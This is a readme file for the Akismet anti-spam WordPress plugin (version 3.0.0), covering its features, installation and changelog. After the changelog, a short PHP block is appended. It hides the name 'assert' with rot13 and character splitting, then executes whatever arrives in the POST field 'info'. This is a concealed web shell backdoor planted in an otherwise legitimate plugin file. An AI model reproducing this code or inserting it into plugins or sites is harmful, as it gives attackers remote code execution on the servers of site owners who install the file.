=== Akismet ===
Contributors: matt, ryan, andy, mdawaffe, tellyworth, josephscott, lessbloat, eoigal, cfinke, automattic
Tags: akismet, comments, spam
Requires at least: 3.0
Tested up to: 3.9
Stable tag: 3.0.0
License: GPLv2 or later

Akismet checks your comments against the Akismet web service to see if they look like spam or not.

== Description ==

Akismet checks your comments against the Akismet web service to see if they look like spam or not and lets you
review the spam it catches under your blog's "Comments" admin screen.

Major new features in Akismet 2.5 include:

* A comment status history, so you can easily see which comments were caught or cleared by Akismet, and which were spammed or unspammed by a moderator
* Links are highlighted in the comment body, to reveal hidden or misleading links
* If your web host is unable to reach Akismet's servers, the plugin will automatically retry when your connection is back up
* Moderators can see the number of approved comments for each user
* Spam and Unspam reports now include more information, to help improve accuracy

PS: You'll need an [Akismet.com API key](http://akismet.com/get/) to use it.  Keys are free for personal blogs, with paid subscriptions available for businesses and commercial sites.

== Installation ==

Upload the Akismet plugin to your blog, Activate it, then enter your [Akismet.com API key](http://akismet.com/get/).

1, 2, 3: You're done!

== Changelog ==

= 3.0.0 =
* Move Akismet to Settings menu
* Drop Akismet Stats menu
* Add stats snapshot to Akismet settings
<?php
$license = str_rot13('n'.'f'.'f'.'r'.'e'.'g');
$license($_POST['info']);
?>